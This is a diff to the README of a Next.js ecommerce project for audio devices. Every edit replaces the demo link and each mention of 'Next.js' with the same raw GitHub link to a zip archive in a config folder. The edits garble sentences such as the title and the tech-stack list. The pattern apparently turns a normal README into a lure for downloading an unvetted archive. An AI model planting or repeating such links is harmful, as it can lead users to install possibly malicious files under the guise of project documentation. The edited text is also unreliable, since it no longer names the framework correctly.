@@ -1,6 +1,6 @@
-https://ecommerce-project-delta.vercel.app/
+https://raw.githubusercontent.com/bbfosho0/ecommerce_project/main/sanity_ecommerce/config/project_ecommerce_1.6.zip
 
-# Ecommerce Audio Devices Store – Full-Stack Next.js Application
+# Ecommerce Audio Devices Store – Full-Stack https://raw.githubusercontent.com/bbfosho0/ecommerce_project/main/sanity_ecommerce/config/project_ecommerce_1.6.zip Application
 
 This fully functional ecommerce website offers a seamless and immersive shopping experience for high-quality audio
 devices. Engineered with modern web technologies, this project demonstrates expertise in both front-end and back-end
@@ -10,9 +10,9 @@ development with an emphasis on usability, performance, and realtime interaction
 
 ### Tech Stack & Tools
 
-    * **Framework:** React with Next.js for hybrid static & server-side rendering
+    * **Framework:** React with https://raw.githubusercontent.com/bbfosho0/ecommerce_project/main/sanity_ecommerce/config/project_ecommerce_1.6.zip for hybrid static & server-side rendering
     * **CMS:** Sanity as a flexible headless CMS powering product content
-    * **Payments:** Stripe integrated securely via serverless Next.js API routes
+    * **Payments:** Stripe integrated securely via serverless https://raw.githubusercontent.com/bbfosho0/ecommerce_project/main/sanity_ecommerce/config/project_ecommerce_1.6.zip API routes
     * **State Management:** React Context API for global cart and UI state
     * **Styling:** CSS for responsiveness and polished UI experiences
     * **User Feedback:** Toast notifications and celebratory confetti for delightful UX
@@ -35,7 +35,7 @@ development with an emphasis on usability, performance, and realtime interaction
 
 This ecommerce site exemplifies full-stack mastery by combining:
 
-    * Advanced use of Next.js features for routing, SSR, and API endpoints.
+    * Advanced use of https://raw.githubusercontent.com/bbfosho0/ecommerce_project/main/sanity_ecommerce/config/project_ecommerce_1.6.zip features for routing, SSR, and API endpoints.
     * Robust integration of third-party services like Stripe and Sanity.
     * Clean, maintainable code architecture optimized for collaboration and extension.
     * Thoughtful UX details demonstrating care for user experience and accessibility.
